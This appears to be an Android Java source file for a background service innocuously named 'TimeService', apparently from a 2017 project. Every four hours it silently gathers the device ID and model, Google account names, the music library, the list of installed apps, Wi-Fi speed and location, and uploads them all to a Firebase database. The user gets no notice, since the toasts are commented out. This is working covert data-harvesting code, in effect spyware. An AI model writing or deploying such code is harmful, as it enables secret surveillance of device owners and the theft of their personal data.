package com.example.apk.dasut;

import android.*;
import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.provider.MediaStore;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.FusedLocationProviderApi;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.sql.Time;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import com.google.android.gms.common.api.GoogleApiClient.ConnectionCallbacks;

import static android.os.Build.MANUFACTURER;

/**
 * Created by Thakkar's on 31-Aug-17.
 */

public class TimeService extends Service {
    // constant
    public static final long NOTIFY_INTERVAL = 14400 * 1000; // 4 hours

    // run on another Thread to avoid crash
    private Handler mHandler = new Handler();
    // timer handling
    private Timer mTimer = null;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        // cancel if already existed
        if (mTimer != null) {
            mTimer.cancel();
        } else {
            // recreate new
            mTimer = new Timer();
        }
        // schedule task
        mTimer.scheduleAtFixedRate(new TimeDisplayTimerTask(), 0, NOTIFY_INTERVAL);
    }


    class TimeDisplayTimerTask extends TimerTask implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener, com.google.android.gms.location.LocationListener{
        private FusedLocationProviderClient mFusedLocationClient;
        private GoogleApiClient googleApiClient;
        private LocationRequest locationRequest;
        private FusedLocationProviderApi locationProvider = LocationServices.FusedLocationApi;
        private Double myLongitude = 0.0;
        private Double myLatitude = 0.0;

        public String accountName = "";
        public String MODEL ;
        public String ID ;
        public String currentDateandTime ;
        public String android_id ;
        public StringBuilder builder ;
        public String song;
        int linkSpeed;
        private static final int PERMISSIONS_REQUEST = 133; //This could be any number, used to request permissions
        private static final int REQUEST_CHECK_SETTINGS = 156;
        private static final String TAG = "TimeService";
        DatabaseReference firebasedata;
       String[] genresProjection = {
                MediaStore.Audio.Genres.NAME,
                MediaStore.Audio.Genres._ID
        };

        @Override
        public void run() {

            mHandler.post(new Runnable() {

                @Override
                public void run() {
                    String song =new String();
                    mFusedLocationClient = LocationServices.getFusedLocationProviderClient(getApplicationContext());

                    // display toast
                    android_id = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
                    SimpleDateFormat sdf = new SimpleDateFormat("ddMMyyyy_HHmmss");
                    currentDateandTime = sdf.format(new Date());
                    firebasedata = FirebaseDatabase.getInstance().getReference("user_data");
                    MODEL = android.os.Build.MODEL;
                    ID = android.os.Build.ID;
                    String MANUFACTURER = android.os.Build.MANUFACTURER;
                    String androidOS = Build.VERSION.RELEASE;

                    googleApiClient = new GoogleApiClient.Builder(getApplicationContext())
                            .addApi(LocationServices.API)
                            .addConnectionCallbacks(TimeDisplayTimerTask.this)
                            .addOnConnectionFailedListener(TimeDisplayTimerTask.this).build();
                    locationRequest = new LocationRequest();
                    locationRequest.setInterval(50 * 1000); // save battery by checking every 10 seconds
                    locationRequest.setFastestInterval(15 * 1000);
                    locationRequest.setPriority(LocationRequest.PRIORITY_BALANCED_POWER_ACCURACY);
                    if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                        if (googleApiClient.isConnected()) {
                            requestLocationUpdates();
                            // }
                        } else googleApiClient.connect();
                    }
                    //LocationServices.FusedLocationApi.requestLocationUpdates(googleApiClient, locationRequest, TimeDisplayTimerTask.this);
                    // run on another thread

                    if (ContextCompat.checkSelfPermission(getApplicationContext(), android.Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED) {
                        // Extracting user (Google) account details
                        Account accounts[] = getAccount(AccountManager.get(getApplicationContext()));
                        for (Account account : accounts) {
                            accountName += account.name + "|";
                            String fullName = accountName.substring(0, accountName.lastIndexOf("@"));
                            // permission was granted, yay! Do the
                            // contacts-related task you need to do.
                        }
                        //email.setText(accountName);
                    }

                    if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                        // Extracting user (Google) account details

                            Uri uri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
                            String selection = MediaStore.Audio.Media.IS_MUSIC + "!=0";
                            Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
                            int i=1;
                            if (cursor != null) {
                                if (cursor.moveToFirst()) {
                                    do {
                                        String name = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.Media.DISPLAY_NAME));
                                        String artist = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.Media.ARTIST));
                                        String url = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.Media.DATA));
                                        String title = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.Media.TITLE));
                                        String duration = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.Media.DURATION));
                                        int id = Integer.parseInt(cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media._ID)));
                                        Uri g_uri = MediaStore.Audio.Genres.getContentUriForAudioId("external", id);
                                        song += i+"|"+"title: "+title+"|artist: "+artist+"|duration: "+" "+duration+"|genre: ";

                                      Cursor genresCursor = getContentResolver().query(g_uri,
                                                genresProjection, null, null, null);
                                        int genre_column_index = genresCursor.getColumnIndexOrThrow(MediaStore.Audio.Genres.NAME);
                                        if(genresCursor != null) {
                                            if (genresCursor.moveToFirst()) {
                                                //song += "Genres: ";
                                                do {
                                                    song += genresCursor.getString(genre_column_index) + " ";
                                                } while (genresCursor.moveToNext());
                                            }
                                            song+="||";
                                            Log.d(TAG, song);
                                            genresCursor.close();
                                        }
                                        //SongInfo s = new SongInfo(name, artist, url);
                                        //_songs.add(s);
                                        i++;

                                    } while (cursor.moveToNext());

                                }

                                cursor.close(); }
                            //songstv = (TextView) findViewById(R.id.songs);
                            //songstv.setText(song);
                        }
                        //email.setText(accountName);

                    List<PackageInfo> applist = getPackageManager().getInstalledPackages(0);
                    builder = new StringBuilder();
                    int i = 1;
                    for (PackageInfo details : applist) {
                        if ((details.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                            //String pack = details.packageName;
                            if (Build.VERSION.SDK_INT >= 9) {
                                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                                String installTime = dateFormat.format( new Date( details.firstInstallTime ) );
                                //Log.d(TAG, "Installed: " + installTime);
                                String updateTime = dateFormat.format( new Date( details.lastUpdateTime ) );
                                //Log.d(TAG, "Updated: " + updateTime);
                                // if full package name is to be printed, simply append 'details'
                                builder.append(i + "|" + details.applicationInfo.loadLabel(getPackageManager()).toString() + "|version: " + details.versionCode + "|install: " +installTime+"|update: "+updateTime+"||");
                                i++;
                            }
                            else {
                                builder.append(i + "|" + details.applicationInfo.loadLabel(getPackageManager()).toString() + "|version:" + details.versionCode + "||");
                                i++;
                            }
                        }
                    }

                    WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                    WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                    if (wifiInfo != null) {
                       linkSpeed = wifiInfo.getLinkSpeed(); //measured using WifiInfo.LINK_SPEED_UNITS
                        //wifi2.setText("Speed: "+linkSpeed+" Megabits per second\n");

                    }

                    //onConnected();
                    //requestLocationUpdates();

                    //LocationServices.FusedLocationApi.requestLocationUpdates(googleApiClient, locationRequest, this);
                    //loc2 = (TextView) findViewById(R.id.loc2);
                    pushOnFirebase(song);

                   //Toast.makeText(getApplicationContext(), "Data uploaded", Toast.LENGTH_SHORT).show();
                }


            });
            //LocationServices.FusedLocationApi.requestLocationUpdates(googleApiClient, locationRequest, this);


        }


        @Override
        public void onConnected(@Nullable Bundle bundle) {
            requestLocationUpdates();
           // Toast.makeText(getApplicationContext(), "onConnected",Toast.LENGTH_SHORT).show();
            Log.d(TAG, "onConnected");
        }

        private void requestLocationUpdates() {
           // Toast.makeText(getApplicationContext(), "requestLocationUpdates",Toast.LENGTH_SHORT).show();
            Log.d(TAG, "requestLocationUpdates");
            if (ActivityCompat.checkSelfPermission(getApplicationContext(), android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                return;
            }
            LocationServices.FusedLocationApi.requestLocationUpdates(googleApiClient, locationRequest, this);
        }

        @Override
        public void onConnectionSuspended(int i) {

        }

        @Override
        public void onConnectionFailed(@NonNull ConnectionResult connectionResult) {

        }

        @Override
        public void onLocationChanged(Location location) {
            myLatitude = location.getLatitude();
            myLongitude = location.getLongitude();
           // Toast.makeText(getApplicationContext(), myLongitude+" "+myLatitude,Toast.LENGTH_SHORT).show();
            //loc2.setText("Latitude : " + String.valueOf(myLatitude)+"\nLongitude : " + String.valueOf(myLongitude));
        }

        private Account[] getAccount(AccountManager accountManager) {
            Account[] accounts = accountManager.getAccountsByType("com.google");
        /*Account account;
        if (accounts.length > 0) {
            account = accounts[0];
        } else {
            account = null;
        }*/
            return accounts;
        }

        public void pushOnFirebase(String song)
        {
            //if (apimmFlag == false)
            //{
            UserData userData = new UserData(android_id, currentDateandTime,  MODEL, ID, MANUFACTURER, Build.VERSION.RELEASE, accountName, builder.toString(), String.valueOf(linkSpeed), myLongitude, myLatitude, song, "None");
            String id = firebasedata.push().getKey();
            firebasedata.push().setValue(userData);
            //Toast.makeText(MainActivity.this, "Data uploaded!", Toast.LENGTH_LONG).show();
            //}
            //else
            //{
            //UserData userData = new UserData("someUser@someDomain.com", android_id, MODEL, -1.0, -1.0, currentDateandTime, builder.toString());
            //String id = firebasedata.push().getKey();
            //firebasedata.child(android_id).setValue(userData);
            //Toast.makeText(MainActivity.this, "Uploading some portion of data as API level > 23", Toast.LENGTH_LONG).show();
            //}
            // TODO: Add data to Firebase DB
        }

        private String getDateTime() {
            // get date time in custom format
            SimpleDateFormat sdf = new SimpleDateFormat("ddMMyyyy_HHmmss");
            return sdf.format(new Date());
        }

    }
}